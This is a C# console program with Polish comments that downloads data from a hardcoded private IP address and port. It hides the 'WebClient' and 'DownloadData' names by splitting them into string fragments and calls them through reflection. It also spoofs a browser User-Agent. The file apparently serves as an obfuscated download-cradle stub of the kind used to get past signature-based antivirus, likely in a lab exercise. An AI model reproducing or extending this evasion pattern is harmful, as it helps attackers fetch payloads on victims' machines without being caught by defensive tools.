using System;
using System.Text;
using System.Net;
using System.Reflection;

class Program
{
    static void Main()
    {
        string typeName = string.Join("", new string[] { "We", "bC", "li", "ent" });
        string methodName = string.Join("", new string[] { "Do", "wn", "load", "Data" });
        string url = string.Join("", new string[] { "http", "://", "10", ".", "10", ".", "191", ".", "108", ":", "8433", "/" });

        // Załadowanie assembly System.dll
        Assembly sysAsm = typeof(WebClient).Assembly;  // System.dll
        Type wcType = sysAsm.GetType("System.Net." + typeName);

        object wc = Activator.CreateInstance(wcType);

        // Ustawienie User-Agent przez refleksję
 var headersProp = wc.GetType().GetProperty("Headers");
var headers = headersProp.GetValue(wc, null);

var itemProp = headers.GetType().GetProperty(
    "Item",
    BindingFlags.Public | BindingFlags.Instance,
    null,
    typeof(string),
    new Type[] { typeof(string) },
    null
);

itemProp.SetValue(headers, 
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    new object[] { "User-Agent" }
);

        // Pobranie danych przez refleksję
        byte[] response = (byte[])wc.GetType().GetMethod(methodName).Invoke(wc, new object[] { url });

        Console.WriteLine("Downloaded Bytes");
        Console.WriteLine(response.Length);
        string html = Encoding.ASCII.GetString(response);
        Console.WriteLine("HTML Content");
        Console.WriteLine(html);
    }
}
